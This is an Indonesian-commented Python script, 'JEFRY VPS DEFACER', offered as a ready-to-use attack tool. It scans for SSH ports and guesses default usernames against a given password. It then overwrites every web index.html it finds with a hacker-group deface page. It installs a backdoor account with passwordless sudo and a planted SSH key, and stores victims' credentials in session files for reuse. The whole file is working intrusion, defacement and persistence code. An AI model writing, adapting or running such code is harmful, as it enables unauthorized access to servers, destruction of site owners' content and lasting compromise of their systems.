#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Title: JEFRY VPS DEFACER - TERMUX EDITION
# Version: 5.1
# Author: JEFRY DARK MODE

import os
import sys
import time
import paramiko
from scp import SCPClient  # FIX: pake scp client khusus
import socket
import base64
from io import StringIO

# ========== WARNA ==========
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
RESET = "\033[0m"
BOLD = "\033[1m"

# ========== HTML DEFACE ==========
DEFACE_HTML = '''<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PwnedKingXploit</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            font-family: 'Courier New', monospace;
            overflow: hidden;
            position: relative;
        }
        .matrix-bg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: 0;
        }
        .matrix-column {
            position: absolute;
            top: -100%;
            color: #0f0;
            font-size: 14px;
            opacity: 0.3;
            animation: matrix-fall 10s linear infinite;
            text-shadow: 0 0 5px #0f0;
        }
        @keyframes matrix-fall {
            0% { top: -100%; }
            100% { top: 100%; }
        }
        .container {
            position: relative;
            z-index: 10;
            text-align: center;
            padding: 20px;
        }
        .image-circle {
            width: 250px;
            height: 250px;
            border-radius: 50%;
            overflow: hidden;
            border: 4px solid #ff0000;
            box-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 60px #ff0000;
            margin: 0 auto 30px;
            animation: pulse 2s ease-in-out infinite;
        }
        .image-circle img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            filter: grayscale(100%);
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); box-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000; }
            50% { transform: scale(1.02); box-shadow: 0 0 30px #ff0000, 0 0 60px #ff0000, 0 0 80px #ff6600; }
        }
        .glitch-text {
            font-size: 2.5rem;
            color: #fff;
            text-transform: uppercase;
            letter-spacing: 3px;
            text-shadow: 2px 2px #ff0000;
            animation: glitch 1s linear infinite;
            margin-bottom: 20px;
            font-weight: bold;
        }
        @keyframes glitch {
            2%, 64% { transform: translate(2px,0) skew(0deg); }
            4%, 60% { transform: translate(-2px,0) skew(0deg); }
            62% { transform: translate(0,0) skew(5deg); }
        }
        .team-tags {
            display: flex;
            gap: 15px;
            justify-content: center;
            flex-wrap: wrap;
            margin-top: 30px;
        }
        .tag {
            background: linear-gradient(45deg, #ff0000, #8b0000);
            color: #fff;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 0.9rem;
            font-weight: bold;
            text-transform: lowercase;
            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
            border: 1px solid #ff4444;
        }
        .scanlines {
            position: fixed;
            top: 0;
            left: 0;

width: 100%;
            height: 100%;
            background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.2) 50%, rgba(0,0,0,0.2));
            background-size: 100% 4px;
            pointer-events: none;
            z-index: 100;
            animation: scanline 8s linear infinite;
        }
        @keyframes scanline {
            0% { transform: translateY(0); }
            100% { transform: translateY(10px); }
        }
    </style>
</head>
<body>
    <div class="matrix-bg" id="matrix"></div>
    <div class="scanlines"></div>
    <div class="container">
        <div class="image-circle">
            <img src="https://files.catbox.moe/1hjdvp.jpg" alt="PwnedKingXploit">
        </div>
        <h1 class="glitch-text" data-text="PwnedKingXploit">PwnedKingXploit</h1>
        <p style="color: #ff4444; font-size: 1.3rem; text-shadow: 0 0 10px #ff0000;">
            web lu udah gue tebas
        </p>
        <div class="team-tags">
            <span class="tag">#jefry</span>
            <span class="tag">#gii</span>
            <span class="tag">#hanz</span>
            <span class="tag">#allteamdreamhack</span>
        </div>
    </div>
    <script>
        const matrix = document.getElementById('matrix');
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
        for (let i = 0; i < 20; i++) {
            const column = document.createElement('div');
            column.className = 'matrix-column';
            column.style.left = Math.random() * 100 + '%';
            column.style.animationDuration = (Math.random() * 5 + 5) + 's';
            column.style.animationDelay = Math.random() * 5 + 's';
            let text = '';
            for (let j = 0; j < 50; j++) {
                text += chars[Math.floor(Math.random() * chars.length)] + '<br>';
            }
            column.innerHTML = text;
            matrix.appendChild(column);
        }
    </script>
</body>
</html>
'''

# ========== FUNGSI SCAN PORT ==========
def scan_ssh_port(ip):
    print(f"{YELLOW}[*] Scanning SSH port on {ip}...{RESET}")
    common_ports = [22, 2222, 222, 2022, 22222, 65022, 65002, 22022, 22220, 2210]
    
    for port in common_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            if result == 0:
                print(f"{GREEN}[+] Found open port: {port}{RESET}")
                sock.close()
                return port
            sock.close()
        except:
            pass
    return None

# ========== FUNGSI COBA USERNAME ==========
def try_usernames(ip, port, password):
    usernames = ["root", "admin", "ubuntu", "user", "vpsuser", "azureuser", "opc", "debian", "centos", "administrator"]
    
    for username in usernames:
        try:
            print(f"{YELLOW}[*] Trying: {username}{RESET}", end="\r")
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, port=port, username=username, password=password, timeout=3)
            print(f"{GREEN}[✓] Success: {username}{RESET}          ")
            return ssh, username
        except paramiko.AuthenticationException:
            continue
        except:
            break
    return None, None

# ========== FUNGSI UPLOAD TANPA FILE TEMP ==========
def upload_html(ssh, scp, html_content, remote_path):
    """
    Upload HTML langsung tanpa file temp
    Pake 3 metode: SCP StringIO, Base64, atau heredoc
    """
    
    # Metode 1: SCP dengan StringIO (paling cepat)
    if scp:
        try:
            print(f"{YELLOW}[*] Upload via SCP StringIO...{RESET}")
            f = StringIO(html_content)
            scp.putfo(f, remote_path)

ssh.exec_command(f"chmod 644 {remote_path}")
            print(f"{GREEN}[✓] Upload via SCP berhasil{RESET}")
            return True
        except Exception as e:
            print(f"{RED}[-] SCP gagal: {e}{RESET}")
    
    # Metode 2: Base64 (paling aman)
    try:
        print(f"{YELLOW}[*] Upload via Base64...{RESET}")
        html_base64 = base64.b64encode(html_content.encode()).decode()
        cmd = f"echo '{html_base64}' | base64 -d > {remote_path} && chmod 644 {remote_path}"
        ssh.exec_command(cmd)
        print(f"{GREEN}[✓] Upload via Base64 berhasil{RESET}")
        return True
    except Exception as e:
        print(f"{RED}[-] Base64 gagal: {e}{RESET}")
    
    # Metode 3: Heredoc (untuk file besar)
    try:
        print(f"{YELLOW}[*] Upload via Heredoc...{RESET}")
        cmd = f"""cat > {remote_path} << 'JEFRYEOF'
{html_content}
JEFRYEOF
chmod 644 {remote_path}"""
        ssh.exec_command(cmd)
        print(f"{GREEN}[✓] Upload via Heredoc berhasil{RESET}")
        return True
    except Exception as e:
        print(f"{RED}[-] Heredoc gagal: {e}{RESET}")
    
    return False

# ========== FUNGSI AUTO DEFACE ==========
def auto_deface(ssh, scp):
    print(f"{YELLOW}[*] Mencari web directory...{RESET}")
    
    # Cari semua folder website
    find_cmds = [
        "find /var/www -type d -name 'html' -o -name 'public_html' -o -name 'htdocs' 2>/dev/null | head -10",
        "find /home -type d -name 'public_html' 2>/dev/null | head -5",
        "find /usr/share/nginx -type d -name 'html' 2>/dev/null | head -5",
        "find / -path '*/www/*' -type d -name 'html' 2>/dev/null | grep -v 'node_modules' | head -5"
    ]
    
    web_dirs = []
    for cmd in find_cmds:
        try:
            stdin, stdout, stderr = ssh.exec_command(cmd)
            output = stdout.read().decode().strip()
            if output:
                for dir_path in output.split('\n'):
                    if dir_path and dir_path not in web_dirs:
                        web_dirs.append(dir_path)
                        print(f"{GREEN}[+] Found: {dir_path}{RESET}")
        except:
            pass
    
    if not web_dirs:
        print(f"{RED}[-] No web directory found!{RESET}")
        return False
    
    # Deface semua directory
    success = 0
    for web_dir in web_dirs:
        remote_path = f"{web_dir}/index.html"
        
        # Backup file asli
        try:
            backup_cmd = f"cp {remote_path} {remote_path}.backup 2>/dev/null"
            ssh.exec_command(backup_cmd)
        except:
            pass
        
        # Upload HTML
        if upload_html(ssh, scp, DEFACE_HTML, remote_path):
            print(f"{GREEN}[✓] Defaced: {remote_path}{RESET}")
            success += 1
        else:
            print(f"{RED}[-] Failed: {remote_path}{RESET}")
    
    print(f"\n{GREEN}[✓] TOTAL: {success} website berhasil dideface{RESET}")
    return success > 0

# ========== FUNGSI INSTALL BACKDOOR ==========
def install_backdoor(ssh, ip):
    print(f"{YELLOW}[*] Installing backdoor...{RESET}")
    
    new_user = "jefrydark"
    new_pass = "PwnedKingXploit2025!"
    
    commands = [
        f"useradd -m -s /bin/bash {new_user} 2>/dev/null",
        f"echo '{new_user}:{new_pass}' | chpasswd 2>/dev/null",
        f"usermod -aG sudo {new_user} 2>/dev/null",
        f"echo '{new_user} ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers 2>/dev/null",
        f"mkdir -p /home/{new_user}/.ssh",
        f"chmod 700 /home/{new_user}/.ssh",
        f"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7LyJflBJ8yJrvKEnQwJwVqJfMtjCqGtC8mQqWxVHp9JcXJxYz8LqYs2ZJwVqJfMtjCqGtC8mQqWxVHp9JcXJxYz8LqYs2ZJwVqJfMtjCqGtC8mQqWxVHp9JcXJxYz8LqYs2Z' > /home/{new_user}/.ssh/authorized_keys",
        f"chmod 600 /home/{new_user}/.ssh/authorized_keys",
        f"chown -R {new_user}:{new_user} /home/{new_user}/.ssh"

]
    
    for cmd in commands:
        try:
            ssh.exec_command(cmd)
            time.sleep(0.2)
        except:
            pass
    
    print(f"{GREEN}[✓] Backdoor installed!{RESET}")
    print(f"{CYAN}User: {new_user}{RESET}")
    print(f"{CYAN}Pass: {new_pass}{RESET}")
    print(f"{CYAN}Login: ssh {new_user}@{ip}{RESET}")

# ========== FUNGSI MAIN ==========
def main():
    # Banner
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"""{RED}{BOLD}
    ░░░░░██╗███████╗███████╗██████╗ ██╗   ██╗
    ░░░░░██║██╔════╝██╔════╝██╔══██╗╚██╗ ██╔╝
    ░░░░░██║█████╗  █████╗  ██████╔╝ ╚████╔╝ 
    ██╗  ██║██╔══╝  ██╔══╝  ██╔══██╗  ╚██╔╝  
    ╚█████╔╝██║     ██║     ██║  ██║   ██║   
     ╚════╝ ╚═╝     ╚═╝     ╚═╝  ╚═╝   ╚═╝   
{RESET}
{GREEN}{BOLD}═══════════════════════════════════════════════{RESET}
{CYAN}{BOLD}     JEFRY VPS DEFACER - TERMUX EDITION{RESET}
{GREEN}{BOLD}═══════════════════════════════════════════════{RESET}
    """)
    
    while True:
        print(f"\n{CYAN}╔════════════════════════════════════╗{RESET}")
        print(f"{CYAN}║           PREMIUM MENU             ║{RESET}")
        print(f"{CYAN}╠════════════════════════════════════╣{RESET}")
        print(f"{CYAN}║{RESET} {YELLOW}1. Login VPS (visible password){RESET}    {CYAN}║{RESET}")
        print(f"{CYAN}║{RESET} {YELLOW}2. Auto Scan + Login{RESET}               {CYAN}║{RESET}")
        print(f"{CYAN}║{RESET} {YELLOW}3. Deface (pake session){RESET}           {CYAN}║{RESET}")
        print(f"{CYAN}║{RESET} {YELLOW}4. Install Backdoor{RESET}                {CYAN}║{RESET}")
        print(f"{CYAN}║{RESET} {YELLOW}5. Exit{RESET}                            {CYAN}║{RESET}")
        print(f"{CYAN}╚════════════════════════════════════╝{RESET}")
        
        choice = input(f"\n{BOLD}Pilih menu (1-5): {RESET}").strip()
        
        if choice == "1":
            # Login manual
            ip = input("IP: ").strip()
            if not ip: continue
            
            # Password visible (bisa dilihat)
            pw = input("Password: ").strip()
            if not pw: continue
            
            port = 22
            username = "root"
            
            print(f"{YELLOW}[*] Connecting...{RESET}")
            
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, port=port, username=username, password=pw, timeout=10)
                
                print(f"{GREEN}[✓] Login berhasil sebagai {username}{RESET}")
                
                # Buat SCP client
                scp = SCPClient(ssh.get_transport())
                
                # Tampilkan info
                stdin, stdout, stderr = ssh.exec_command("uname -a; whoami; df -h / | tail -1")
                print(stdout.read().decode())
                
                # Simpan session
                with open(f"session_{ip}.txt", "w") as f:
                    f.write(f"{ip}|{port}|{username}|{pw}")
                
                # Mode command
                while True:
                    cmd = input(f"\n{GREEN}{username}@{ip}{RESET} $ ").strip()
                    
                    if cmd.lower() == "exit":
                        break
                    elif cmd == "/deface":
                        auto_deface(ssh, scp)
                    elif cmd == "/backdoor":
                        install_backdoor(ssh, ip)
                    elif cmd:
                        stdin, stdout, stderr = ssh.exec_command(cmd)
                        out = stdout.read().decode()
                        err = stderr.read().decode()
                        if out: print(out)
                        if err: print(f"{RED}{err}{RESET}")

scp.close()
                ssh.close()
                
            except paramiko.AuthenticationException:
                print(f"{RED}[-] Login gagal!{RESET}")
            except Exception as e:
                print(f"{RED}[-] Error: {e}{RESET}")
        
        elif choice == "2":
            # Auto scan
            ip = input("IP target: ").strip()
            if not ip: continue
            
            port = scan_ssh_port(ip)
            if not port:
                print(f"{RED}[-] No open SSH port{RESET}")
                continue
            
            pw = input(f"Password (port {port}): ").strip()
            if not pw: continue
            
            ssh, username = try_usernames(ip, port, pw)
            
            if ssh:
                print(f"{GREEN}[✓] Login sebagai {username}{RESET}")
                scp = SCPClient(ssh.get_transport())
                
                # Tanya deface
                deface = input("Langsung deface? (y/n): ").strip().lower()
                if deface == 'y':
                    auto_deface(ssh, scp)
                
                ssh.close()
            else:
                print(f"{RED}[-] Gagal login{RESET}")
        
        elif choice == "3":
            # Deface pake session
            import glob
            sessions = glob.glob("session_*.txt")
            
            if not sessions:
                print(f"{RED}[-] No saved sessions{RESET}")
                continue
            
            print(f"{CYAN}Saved sessions:{RESET}")
            for i, sess in enumerate(sessions):
                with open(sess, 'r') as f:
                    data = f.read().strip().split('|')
                    if len(data) >= 3:
                        print(f"{i+1}. {data[0]} ({data[2]})")
            
            idx = input(f"Pilih (1-{len(sessions)}): ").strip()
            try:
                with open(sessions[int(idx)-1], 'r') as f:
                    ip, port, username, pw = f.read().strip().split('|')
                
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, port=int(port), username=username, password=pw, timeout=10)
                
                scp = SCPClient(ssh.get_transport())
                
                auto_deface(ssh, scp)
                
                ssh.close()
            except Exception as e:
                print(f"{RED}[-] Error: {e}{RESET}")
        
        elif choice == "4":
            # Install backdoor
            ip = input("IP target: ").strip()
            if not ip: continue
            
            # Cek session
            session_file = f"session_{ip}.txt"
            if not os.path.exists(session_file):
                print(f"{RED}[-] No session for {ip}{RESET}")
                continue
            
            with open(session_file, 'r') as f:
                ip, port, username, pw = f.read().strip().split('|')
            
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, port=int(port), username=username, password=pw, timeout=10)
                
                install_backdoor(ssh, ip)
                ssh.close()
            except Exception as e:
                print(f"{RED}[-] Error: {e}{RESET}")
        
        elif choice == "5":
            print(f"{YELLOW}Exiting...{RESET}")
            break

if name == "main":
    # Cek dependencies
    try:
        import paramiko
        from scp import SCPClient
    except ImportError as e:
        print(f"{RED}Install dulu: pip install paramiko scp{RESET}")
        sys.exit(1)
    
    main()
